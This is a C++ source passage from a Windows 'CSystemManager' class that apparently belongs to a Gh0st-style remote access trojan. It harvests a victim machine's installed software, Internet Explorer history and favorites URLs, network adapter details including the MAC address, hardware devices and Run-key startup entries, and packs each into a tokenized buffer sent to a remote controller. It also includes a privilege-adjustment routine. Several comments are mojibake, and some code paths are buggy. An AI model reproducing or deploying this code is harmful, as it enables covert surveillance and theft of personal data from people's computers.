void CSystemManager::SendSoftWareList()
{
	LPBYTE	lpBuffer = getSoftWareList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

LPBYTE	lpFUBuffer = NULL;
DWORD	dwFUOffset = 1; // λ��ָ��
void FindFavoritesUrl(char* searchfilename)
{
	char favpath[MAX_PATH] = { 0 };
	char tmpPath[MAX_PATH] = { 0 };
	DWORD	dwFULength = 0;

	lstrcat(favpath, searchfilename);
	lstrcat(favpath, "\\*.*");

	WIN32_FIND_DATA fd;
	ZeroMemory(&fd, sizeof(WIN32_FIND_DATA));

	HANDLE hFind = FindFirstFile(favpath, &fd); // �ļ���׺���� url
	do
	{
		if (fd.cFileName[0] != '.')
		{
			strcpy(tmpPath, searchfilename);
			strcat(tmpPath, "\\");
			strcat(tmpPath, fd.cFileName);
			if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				FindFavoritesUrl(tmpPath);
			}
			else if (strstr(fd.cFileName, ".url"))
			{
				//				printf("�ļ��� �� %s ƥ�� \r\n",fd.cFileName);

				TCHAR buf[MAX_PATH] = { 0 };
				::GetPrivateProfileString("InternetShortcut", "URL", "", buf, sizeof(buf), tmpPath);

				dwFULength = lstrlen(buf) + lstrlen(fd.cFileName) + 2;

				if (LocalSize(lpFUBuffer) < (dwFUOffset + dwFULength))
					lpFUBuffer = (LPBYTE)LocalReAlloc(lpFUBuffer, (dwFUOffset + dwFULength) + 1024, LMEM_ZEROINIT | LMEM_MOVEABLE);

				memcpy(lpFUBuffer + dwFUOffset, fd.cFileName, lstrlen(fd.cFileName) + 1);
				dwFUOffset += lstrlen(fd.cFileName) + 1;

				memcpy(lpFUBuffer + dwFUOffset, buf, lstrlen(buf) + 1);
				dwFUOffset += lstrlen(buf) + 1;
			}
		}
	} while (FindNextFile(hFind, &fd));
	FindClose(hFind);
}

void CSystemManager::SendIEHistoryList()
{
	LPBYTE	lpBuffer = getIEHistoryList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

#include  <urlhist.h>   //   Needed   for   IUrlHistoryStg2   and   IID_IUrlHistoryStg2
#include  <COMDEF.H>
inline char* UnicodeToAnsi(const wchar_t* szStr)
{
	int nLen = WideCharToMultiByte(CP_ACP, 0, szStr, -1, NULL, 0, NULL, NULL);
	if (nLen == 0)
	{
		return "δ֪";
	}
	char* pResult = new char[nLen];
	WideCharToMultiByte(CP_ACP, 0, szStr, -1, pResult, nLen, NULL, NULL);
	return pResult;
}

LPBYTE CSystemManager::getFavoritesUrlList()
{
	char favpath[MAX_PATH] = { 0 };

	// ��ע����ȡ�ղؼ�����λ��
	HKEY hKEY;
	DWORD type = REG_SZ;
	LPCTSTR path = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";
	DWORD cbData = 80;
	::RegOpenKeyEx(HKEY_CURRENT_USER, path, 0, KEY_READ, &hKEY);
	::RegQueryValueEx(hKEY, "Favorites", NULL, &type, (LPBYTE)favpath, &cbData);
	::RegCloseKey(hKEY);

	lpFUBuffer = (LPBYTE)LocalAlloc(LPTR, 10000);
	lpFUBuffer[0] = TOKEN_FULIST;
	dwFUOffset = 1;

	FindFavoritesUrl(favpath);

	lpFUBuffer = (LPBYTE)LocalReAlloc(lpFUBuffer, dwFUOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);

	return lpFUBuffer;
}

LPBYTE CSystemManager::getIEHistoryList()
{
	HRESULT   hr;
	IUrlHistoryStg2* puhs;
	IEnumSTATURL* pesu;
	STATURL   su;
	ULONG   celt = 0;
	//  _bstr_t   bstr; 
	CoInitialize(NULL);
	hr = CoCreateInstance(CLSID_CUrlHistory, NULL, CLSCTX_INPROC_SERVER, IID_IUrlHistoryStg, (LPVOID*)&puhs);

	LPBYTE	lpBuffer = NULL;
	DWORD	dwOffset = 0;
	DWORD	dwLength = 0;

	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 10000);
	lpBuffer[0] = TOKEN_IHLIST;
	dwOffset = 1;

	char strTime[50] = { 0 };
	char* strUrl, * strTitle;
	if (SUCCEEDED(hr))
	{
		hr = puhs->EnumUrls(&pesu);
		if (SUCCEEDED(hr))
		{
			while (SUCCEEDED(pesu->Next(1, &su, &celt)) && celt > 0)
			{
				strUrl = UnicodeToAnsi(su.pwcsUrl);
				strTitle = UnicodeToAnsi(su.pwcsTitle);

				SYSTEMTIME  st;
				FileTimeToSystemTime(&su.ftLastVisited, &st);
				wsprintf(strTime, "%d-%d-%d %d:%d:%d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wSecond, st.wMinute);

				dwLength = lstrlen(strUrl) + lstrlen(strTitle) + lstrlen(strTime) + 3;

				if (LocalSize(lpBuffer) < (dwOffset + dwLength))
					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);

				memcpy(lpBuffer + dwOffset, strTime, lstrlen(strTime) + 1);
				dwOffset += lstrlen(strTime) + 1;

				memcpy(lpBuffer + dwOffset, strTitle, lstrlen(strTitle) + 1);
				dwOffset += lstrlen(strTitle) + 1;

				memcpy(lpBuffer + dwOffset, strUrl, lstrlen(strUrl) + 1);
				dwOffset += lstrlen(strUrl) + 1;

				if (strcmp(strTitle, "δ֪"))
					delete[] strTitle;
				if (strcmp(strUrl, "δ֪"))
					delete[] strUrl;
			}

			puhs->Release();
		}
	}
	CoUninitialize();

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);

	return lpBuffer;
}

LPBYTE CSystemManager::getSoftWareList()
{
	const int  MAX_LEG = 256 * sizeof(TCHAR);

	LPBYTE 	lpBuffer = NULL;
	DWORD	dwOffset = 1;
	DWORD   dwLength = 0;
	TCHAR regBufferValue[MAX_LEG] = { 0 };
	TCHAR regDisplayName[MAX_LEG] = { 0 };
	TCHAR regPublisher[MAX_LEG] = { 0 };
	TCHAR regDisplayVersion[MAX_LEG] = { 0 };
	TCHAR regInstallDate[MAX_LEG] = { 0 };
	TCHAR regUninstallString[MAX_LEG] = { 0 };

	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	if (lpBuffer == NULL)
		return NULL;

	lpBuffer[0] = TOKEN_SOFTWARE;

	int n = 0;
	HKEY hKey;
	DWORD dwRegNum = MAX_LEG;
	TCHAR regBufferName[MAX_LEG] = { 0 };
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
		NULL, KEY_READ, &hKey) == ERROR_SUCCESS)
	{
		if (RegQueryInfoKey(hKey, NULL, NULL, NULL, &dwRegNum, NULL, NULL, NULL, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
		{
			for (int i = 0; i < (int)dwRegNum; i++)
			{
				DWORD dwRegSize = MAX_LEG;
				RegEnumKeyEx(hKey, i, regBufferName, &dwRegSize, NULL, NULL, NULL, NULL);
				DWORD dwType;
				HKEY hSubKey;
				if (RegOpenKeyEx(hKey, regBufferName, NULL, KEY_READ, &hSubKey) == ERROR_SUCCESS)
				{
					dwRegSize = MAX_LEG;
					memset(regDisplayName, 0, MAX_LEG);
					RegQueryValueEx(hSubKey, "DisplayName", 0, &dwType, (LPBYTE)regDisplayName, &dwRegSize);

					dwRegSize = MAX_LEG;
					memset(regBufferValue, 0, MAX_LEG);
					// ȡParentKeyName��ֵ,�ж��Ƿ��ǲ�����Ϣ, �ǲ�����Ϣ��ֵΪ"OperatingSystem"
					RegQueryValueEx(hSubKey, "ParentKeyName", 0, &dwType, (LPBYTE)regBufferValue, &dwRegSize);
					if (lstrlen(regDisplayName) == 0 || lstrcmp(regBufferValue, "OperatingSystem") == 0) //�ж��Ƿ��ǲ�����Ϣ 
					{
						continue;
					}

					dwRegSize = MAX_LEG;
					memset(regPublisher, 0, MAX_LEG);
					RegQueryValueEx(hSubKey, "Publisher", 0, &dwType, (LPBYTE)regPublisher, &dwRegSize);

					dwRegSize = MAX_LEG;
					memset(regDisplayVersion, 0, MAX_LEG);
					RegQueryValueEx(hSubKey, "DisplayVersion", 0, &dwType, (LPBYTE)regDisplayVersion, &dwRegSize);

					dwRegSize = MAX_LEG;
					memset(regInstallDate, 0, MAX_LEG);
					// �ж��Ƿ�����ע����л�ȡ����װʱ��, ��ȡ�����ʱ��
					if (RegQueryValueEx(hSubKey, "InstallDate", 0, &dwType, (LPBYTE)regInstallDate, &dwRegSize) == ERROR_SUCCESS)
					{
						TCHAR Year[5], Month[5], Day[5];
						lstrcpyn(Year, regInstallDate, 5);
						lstrcpyn(Month, regInstallDate + 4, 3);
						lstrcpyn(Day, regInstallDate + 4 + 2, 3);
						wsprintf(regInstallDate, "%s/%s/%s", Year, Month, Day);
					}
					else
					{
						FILETIME fileLastTime;
						RegQueryInfoKey(hSubKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
							NULL, NULL, NULL, &fileLastTime);
						SYSTEMTIME sTime, stLocal;
						FileTimeToSystemTime(&fileLastTime, &sTime);
						SystemTimeToTzSpecificLocalTime(NULL, &sTime, &stLocal);
						wsprintf(regInstallDate, "%d/%02d/%02d", stLocal.wYear, stLocal.wMonth, stLocal.wDay);
					}

					dwRegSize = MAX_LEG;
					memset(regUninstallString, 0, MAX_LEG);
					RegQueryValueEx(hSubKey, "UninstallString", 0, &dwType, (LPBYTE)regUninstallString, &dwRegSize);

					// ������̫С�������·�����
					dwLength = lstrlen(regDisplayName) + lstrlen(regPublisher) + lstrlen(regDisplayVersion) + lstrlen(regInstallDate) + lstrlen(regUninstallString) + 6;
					if (LocalSize(lpBuffer) < (dwOffset + dwLength))
						lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);

					memcpy(lpBuffer + dwOffset, regDisplayName, lstrlen(regDisplayName) + 1);
					dwOffset += lstrlen(regDisplayName) + 1;

					memcpy(lpBuffer + dwOffset, regPublisher, lstrlen(regPublisher) + 1);
					dwOffset += lstrlen(regPublisher) + 1;

					memcpy(lpBuffer + dwOffset, regDisplayVersion, lstrlen(regDisplayVersion) + 1);
					dwOffset += lstrlen(regDisplayVersion) + 1;

					memcpy(lpBuffer + dwOffset, regInstallDate, lstrlen(regInstallDate) + 1);
					dwOffset += lstrlen(regInstallDate) + 1;

					memcpy(lpBuffer + dwOffset, regUninstallString, lstrlen(regUninstallString) + 1);
					dwOffset += lstrlen(regUninstallString) + 1;
				}
			}
		}
	}
	else
		return FALSE; //�򿪼�ʧ��
	RegCloseKey(hKey);

	if (GetOSVerIs64Bit())
	{
		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
			NULL, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS)
		{
			if (RegQueryInfoKey(hKey, NULL, NULL, NULL, &dwRegNum, NULL, NULL, NULL, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
			{
				for (int i = 0; i < (int)dwRegNum; i++)
				{
					DWORD dwRegSize = MAX_LEG;
					RegEnumKeyEx(hKey, i, regBufferName, &dwRegSize, NULL, NULL, NULL, NULL);
					DWORD dwType;
					HKEY hSubKey;
					if (RegOpenKeyEx(hKey, regBufferName, NULL, KEY_READ, &hSubKey) == ERROR_SUCCESS)
					{
						dwRegSize = MAX_LEG;
						memset(regDisplayName, 0, MAX_LEG);
						RegQueryValueEx(hSubKey, "DisplayName", 0, &dwType, (LPBYTE)regDisplayName, &dwRegSize);

						dwRegSize = MAX_LEG;
						memset(regBufferValue, 0, MAX_LEG);
						// ȡParentKeyName��ֵ,�ж��Ƿ��ǲ�����Ϣ, �ǲ�����Ϣ��ֵΪ"OperatingSystem"
						RegQueryValueEx(hSubKey, "ParentKeyName", 0, &dwType, (LPBYTE)regBufferValue, &dwRegSize);
						if (lstrlen(regDisplayName) == 0 || lstrcmp(regBufferValue, "OperatingSystem") == 0) //�ж��Ƿ��ǲ�����Ϣ 
						{
							continue;
						}

						dwRegSize = MAX_LEG;
						memset(regPublisher, 0, MAX_LEG);
						RegQueryValueEx(hSubKey, "Publisher", 0, &dwType, (LPBYTE)regPublisher, &dwRegSize);

						dwRegSize = MAX_LEG;
						memset(regDisplayVersion, 0, MAX_LEG);
						RegQueryValueEx(hSubKey, "DisplayVersion", 0, &dwType, (LPBYTE)regDisplayVersion, &dwRegSize);

						dwRegSize = MAX_LEG;
						memset(regInstallDate, 0, MAX_LEG);
						// �ж��Ƿ�����ע����л�ȡ����װʱ��, ��ȡ�����ʱ��
						if (RegQueryValueEx(hSubKey, "InstallDate", 0, &dwType, (LPBYTE)regInstallDate, &dwRegSize) == ERROR_SUCCESS)
						{
							TCHAR Year[5], Month[5], Day[5];
							lstrcpyn(Year, regInstallDate, 5);
							lstrcpyn(Month, regInstallDate + 4, 3);
							lstrcpyn(Day, regInstallDate + 4 + 2, 3);
							wsprintf(regInstallDate, "%s/%s/%s", Year, Month, Day);
						}
						else
						{
							FILETIME fileLastTime;
							RegQueryInfoKey(hSubKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
								NULL, NULL, NULL, &fileLastTime);
							SYSTEMTIME sTime, stLocal;
							FileTimeToSystemTime(&fileLastTime, &sTime);
							SystemTimeToTzSpecificLocalTime(NULL, &sTime, &stLocal);
							wsprintf(regInstallDate, "%d/%02d/%02d", stLocal.wYear, stLocal.wMonth, stLocal.wDay);
						}

						dwRegSize = MAX_LEG;
						memset(regUninstallString, 0, MAX_LEG);
						RegQueryValueEx(hSubKey, "UninstallString", 0, &dwType, (LPBYTE)regUninstallString, &dwRegSize);

						// ������̫С�������·�����
						dwLength = lstrlen(regDisplayName) + lstrlen(regPublisher) + lstrlen(regDisplayVersion) + lstrlen(regInstallDate) + lstrlen(regUninstallString) + 6;
						if (LocalSize(lpBuffer) < (dwOffset + dwLength))
							lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);

						memcpy(lpBuffer + dwOffset, regDisplayName, lstrlen(regDisplayName) + 1);
						dwOffset += lstrlen(regDisplayName) + 1;

						memcpy(lpBuffer + dwOffset, regPublisher, lstrlen(regPublisher) + 1);
						dwOffset += lstrlen(regPublisher) + 1;

						memcpy(lpBuffer + dwOffset, regDisplayVersion, lstrlen(regDisplayVersion) + 1);
						dwOffset += lstrlen(regDisplayVersion) + 1;

						memcpy(lpBuffer + dwOffset, regInstallDate, lstrlen(regInstallDate) + 1);
						dwOffset += lstrlen(regInstallDate) + 1;

						memcpy(lpBuffer + dwOffset, regUninstallString, lstrlen(regUninstallString) + 1);
						dwOffset += lstrlen(regUninstallString) + 1;
					}
				}
			}
		}
		else
			return FALSE; //�򿪼�ʧ��
		RegCloseKey(hKey);
	}

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);

	return lpBuffer;
}


bool CSystemManager::DebugPrivilege(const char* PName, BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;

	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}

	CloseHandle(hToken);
	return bResult;
}


void CSystemManager::SendNetconfigList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getNetconfigList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

#include <wininet.h>
#pragma comment(lib,"wininet.lib")

LPBYTE CSystemManager::getNetconfigList()
{
	LPBYTE 	lpBuffer = NULL;
	DWORD	dwOffset = 1;
	DWORD   dwLength = 0;
	char    Name[128];//����
	char    Mac[128];//MAC
	char    IP[128];//IP
	char    Subnet[128];//����
	char    Gateway[128];//����
	char    Describe[128];//����

	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = TOKEN_NETCONFIG;

	PIP_ADAPTER_INFO pIpAdapterInfo = NULL;
	pIpAdapterInfo = new IP_ADAPTER_INFO;

	//�ṹ���С
	unsigned long ulSize = sizeof(IP_ADAPTER_INFO);

	//��ȡ��������Ϣ
	int nRet = GetAdaptersInfo(pIpAdapterInfo, &ulSize);

	if (ERROR_BUFFER_OVERFLOW == nRet)
	{
		//�ռ䲻�㣬ɾ��֮ǰ����Ŀռ�
		delete[]pIpAdapterInfo;

		//���·����С
		pIpAdapterInfo = (PIP_ADAPTER_INFO) new BYTE[ulSize];

		//��ȡ��������Ϣ
		nRet = GetAdaptersInfo(pIpAdapterInfo, &ulSize);

		//��ȡʧ��
		if (ERROR_SUCCESS != nRet)
		{
			if (pIpAdapterInfo != NULL)
			{
				delete[]pIpAdapterInfo;
			}
			return FALSE;
		}
	}

	DWORD flags;
	if (InternetGetConnectedState(&flags, 0))
	{
		if ((flags & INTERNET_CONNECTION_MODEM) == INTERNET_CONNECTION_MODEM)
		{
			strcpy(Name, "��������");
		}
		else if ((flags & INTERNET_CONNECTION_LAN) == INTERNET_CONNECTION_LAN)
		{
			strcpy(Name, "��������");
		}
		else if ((flags & INTERNET_CONNECTION_PROXY) == INTERNET_CONNECTION_PROXY)
		{
			strcpy(Name, "��������");
		}
		else
			strcpy(Name, "δ����");
	}


	NCB ncb;
	typedef struct _ASTAT_
	{
		ADAPTER_STATUS   adapt;
		NAME_BUFFER   NameBuff[30];
	}ASTAT, * PASTAT;

	ASTAT Adapter;

	typedef struct _LANA_ENUM
	{
		UCHAR   length;
		UCHAR   lana[MAX_LANA];
	}LANA_ENUM;

	LANA_ENUM lana_enum;
	UCHAR uRetCode;
	memset(&ncb, 0, sizeof(ncb));
	memset(&lana_enum, 0, sizeof(lana_enum));
	ncb.ncb_command = NCBENUM;
	ncb.ncb_buffer = (unsigned char*)&lana_enum;
	ncb.ncb_length = sizeof(LANA_ENUM);
	uRetCode = Netbios(&ncb);

	//     if(uRetCode != NRC_GOODRET)     
	//         return uRetCode;     

	for (int lana = 0; lana < lana_enum.length; lana++)
	{
		ncb.ncb_command = NCBRESET;
		ncb.ncb_lana_num = lana_enum.lana[lana];
		uRetCode = Netbios(&ncb);
		if (uRetCode == NRC_GOODRET)
			break;
	}

	//     if(uRetCode != NRC_GOODRET)
	//         return uRetCode;     

	memset(&ncb, 0, sizeof(ncb));
	ncb.ncb_command = NCBASTAT;
	ncb.ncb_lana_num = lana_enum.lana[0];
	strcpy((char*)ncb.ncb_callname, "*");
	ncb.ncb_buffer = (unsigned char*)&Adapter;
	ncb.ncb_length = sizeof(Adapter);
	uRetCode = Netbios(&ncb);

	//     if(uRetCode != NRC_GOODRET)
	//         return uRetCode;

	sprintf(Mac, "%02X-%02X-%02X-%02X-%02X-%02X",
		Adapter.adapt.adapter_address[0],
		Adapter.adapt.adapter_address[1],
		Adapter.adapt.adapter_address[2],
		Adapter.adapt.adapter_address[3],
		Adapter.adapt.adapter_address[4],
		Adapter.adapt.adapter_address[5]);

	//��ֵָ��
	PIP_ADAPTER_INFO pIterater = pIpAdapterInfo;
	while (pIterater)
	{

		PIP_ADDR_STRING pIpAddr = &pIterater->IpAddressList;
		while (pIpAddr)
		{
			strcpy(IP, pIpAddr->IpAddress.String);

			strcpy(Subnet, pIpAddr->IpMask.String);

			strcpy(Describe, pIterater->Description);

			//ָ�������б�
			PIP_ADDR_STRING pGateAwayList = &pIterater->GatewayList;
			while (pGateAwayList)
			{
				strcpy(Gateway, pGateAwayList->IpAddress.String);

				pGateAwayList = pGateAwayList->Next;
			}

			pIpAddr = pIpAddr->Next;
		}

		pIterater = pIterater->Next;
	}
	// ������̫С�������·�����
	dwLength = lstrlen(Name) + lstrlen(Mac) + lstrlen(IP) + lstrlen(Subnet) + lstrlen(Gateway) + lstrlen(Describe) + 6;



	if (LocalSize(lpBuffer) < (dwOffset + dwLength))
		lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);

	memcpy(lpBuffer + dwOffset, Name, lstrlen(Name) + 1);
	dwOffset += lstrlen(Name) + 1;

	memcpy(lpBuffer + dwOffset, Mac, lstrlen(Mac) + 1);
	dwOffset += lstrlen(Mac) + 1;

	memcpy(lpBuffer + dwOffset, IP, lstrlen(IP) + 1);
	dwOffset += lstrlen(IP) + 1;

	memcpy(lpBuffer + dwOffset, Subnet, lstrlen(Subnet) + 1);
	dwOffset += lstrlen(Subnet) + 1;

	memcpy(lpBuffer + dwOffset, Gateway, lstrlen(Gateway) + 1);
	dwOffset += lstrlen(Gateway) + 1;

	memcpy(lpBuffer + dwOffset, Describe, lstrlen(Describe) + 1);
	dwOffset += lstrlen(Mac) + 1;

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);

	if (pIpAdapterInfo)
	{
		delete[]pIpAdapterInfo;
	}

	return lpBuffer;

}



void CSystemManager::SendHardwareList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getHardwareList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

#include "setupapi.h"
#include <devguid.h>
#pragma comment(lib,"Setupapi.lib")  

LPBYTE CSystemManager::getHardwareList()
{
	LPBYTE 	lpBuffer = NULL;
	DWORD	dwOffset = 1;
	DWORD   dwLength = 0;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = TOKEN_HARDWARE;


	HDEVINFO hDevInfo;
	SP_DEVINFO_DATA DeviceInfoData;
	DWORD i;

	// Create a HDEVINFO with all present devices.
	hDevInfo = SetupDiGetClassDevs((LPGUID)&GUID_DEVCLASS_DISPLAY,
		0, // Enumerator
		0,
		DIGCF_PRESENT | DIGCF_ALLCLASSES);

	if (hDevInfo == INVALID_HANDLE_VALUE)
	{
		// Insert error handling here.
		return 0;
	}

	// Enumerate through all devices in Set.

	DeviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
	for (i = 0; SetupDiEnumDeviceInfo(hDevInfo, i, &DeviceInfoData); i++)
	{
		DWORD DataT;
		TCHAR buffer[MAX_PATH];
		DWORD buffersize = 0;


		// Call function with null to begin with, 
		// then use the returned buffer size 
		// to Alloc the buffer. Keep calling until
		// success or an unknown failure.
		if (SetupDiGetClassDescription(

			&DeviceInfoData.ClassGuid,

			buffer,

			MAX_PATH,

			NULL))

		{
			if (strcmp(buffer,"")==0)
			{
				sprintf(buffer, "  ");
			}
			dwLength = lstrlen(buffer) + 1;
			if (LocalSize(lpBuffer) < (dwOffset + dwLength))
				lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);
			memcpy(lpBuffer + dwOffset, buffer, lstrlen(buffer) + 1);
			dwOffset += lstrlen(buffer) + 1;

		}

		if (SetupDiGetDeviceRegistryProperty(hDevInfo,
			&DeviceInfoData,
			SPDRP_DEVICEDESC,
			NULL,
			(PBYTE)buffer,
			MAX_PATH,
			NULL))
		{ 	// ������̫С�������·�����
			if (strcmp(buffer, "") == 0)
			{
				sprintf(buffer, "  ");
			}
			dwLength = lstrlen(buffer) + 1;
			if (LocalSize(lpBuffer) < (dwOffset + dwLength))
				lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);
			memcpy(lpBuffer + dwOffset, buffer, lstrlen(buffer) + 1);
			dwOffset += lstrlen(buffer) + 1;
		}

		if (SetupDiGetDeviceRegistryProperty(

			hDevInfo,

			& DeviceInfoData,

			SPDRP_DRIVER,

			NULL,

			(PBYTE)buffer,

			MAX_PATH,

			NULL))

		{
			if (strcmp(buffer, "") == 0)
			{
				sprintf(buffer, "  ");
			}
			dwLength = lstrlen(buffer) + 1;
			if (LocalSize(lpBuffer) < (dwOffset + dwLength))
				lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);
			memcpy(lpBuffer + dwOffset, buffer, lstrlen(buffer) + 1);
			dwOffset += lstrlen(buffer) + 1;

		}

		
	}


	if (GetLastError() != NO_ERROR && GetLastError() != ERROR_NO_MORE_ITEMS)
	{
		//������Ŵ��������
		return 0;
	}

	// ����
	SetupDiDestroyDeviceInfoList(hDevInfo);
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);
	return lpBuffer;
}



void CSystemManager::SendStartupList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getStartupList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}


LPBYTE CSystemManager::getStartupList()
{
	LPBYTE 	lpBuffer = NULL;
	DWORD	dwOffset = 1;
	DWORD   dwLength = 0;
	HKEY hkey;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = TOKEN_STARTUP;

	HKEY hKey;
	HKEY hKey1;

	char Key1[255] = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	char Key[255] = "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";

	LPCTSTR lpSubKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\";


	LPCTSTR lpSubKey1 = "HKEY_LOCAL_MACHINE";
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
	{
		return 0;
	}
	LPCTSTR lpSubKey2 = "HKEY_CURRENT_USER";

#define NAME_LEN 200 
	char szValueName[NAME_LEN];
	BYTE szPortName[NAME_LEN];
	LONG status;
	DWORD dwSizeValueName = 200;
	DWORD dwSizeofPortName = 200;
	DWORD Type;
	dwSizeValueName = NAME_LEN;
	dwSizeofPortName = NAME_LEN;
	DWORD dinx1 = 0;	//HKEY_CURRENT_USER
	DWORD dinx = 0;			//HKEY_LOCAL_MACHINE
	DWORD nsize = 256;

	// ������̫С�������·�����
	dwLength = lstrlen(szValueName) + lstrlen((const char*)szPortName) + lstrlen(Key) + 3;

	if (LocalSize(lpBuffer) < (dwOffset + dwLength))
		lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);



	do
	{
		status = RegEnumValue(hKey, dinx, szValueName, &dwSizeValueName, NULL, &Type,
			szPortName, &dwSizeofPortName);
		if ((status == ERROR_SUCCESS))
		{
			memcpy(lpBuffer + dwOffset, (char*)szValueName, lstrlen((char*)szValueName) + 1);
			dwOffset += lstrlen((char*)szValueName) + 1; //���������


			memcpy(lpBuffer + dwOffset, (char*)szPortName, lstrlen((char*)szPortName) + 1);
			dwOffset += lstrlen((char*)szPortName) + 1; //�����·��


			memcpy(lpBuffer + dwOffset, Key, lstrlen(Key) + 1);
			dwOffset += lstrlen(Key) + 1; //�����·��

			dinx++;
		}
		dwSizeValueName = NAME_LEN;
		dwSizeofPortName = NAME_LEN;
	} while ((status != ERROR_NO_MORE_ITEMS));
	nsize = 256;

	if (RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_READ, &hKey1) != ERROR_SUCCESS)
	{
		return 0;
	}
	do
	{
		status = RegEnumValue(hKey1, dinx1, szValueName, &dwSizeValueName, NULL, &Type,
			szPortName, &dwSizeofPortName);
		if ((status == ERROR_SUCCESS))
		{
			memcpy(lpBuffer + dwOffset, (char*)szValueName, lstrlen((char*)szValueName) + 1);
			dwOffset += lstrlen((char*)szValueName) + 1; //���������

			memcpy(lpBuffer + dwOffset, (char*)szPortName, lstrlen((char*)szPortName) + 1);
			dwOffset += lstrlen((char*)szPortName) + 1; //�����·��

			memcpy(lpBuffer + dwOffset, Key1, lstrlen(Key1) + 1);
			dwOffset += lstrlen(Key1) + 1; //�����·��

			dinx1++;
		}
		dwSizeValueName = NAME_LEN;
		dwSizeofPortName = NAME_LEN;
	} while ((status != ERROR_NO_MORE_ITEMS));
	RegCloseKey(hKey);
	RegCloseKey(hKey1);
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);
	return lpBuffer;
}


